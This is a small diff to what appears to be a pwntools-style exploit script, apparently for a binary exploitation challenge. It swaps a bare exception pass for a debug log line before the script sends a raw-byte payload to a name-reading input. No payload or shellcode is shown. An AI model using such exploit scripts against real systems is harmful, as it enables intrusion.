@@ -442,7 +442,7 @@ def exploit():
     try:
         p.clean(timeout=0.5)
     except Exception:
-        pass
+        log.debug("[cleanup] non-fatal exception ignored")
 
     # Name is read with read(0,newName,255), so send raw bytes
     p.send(payload)
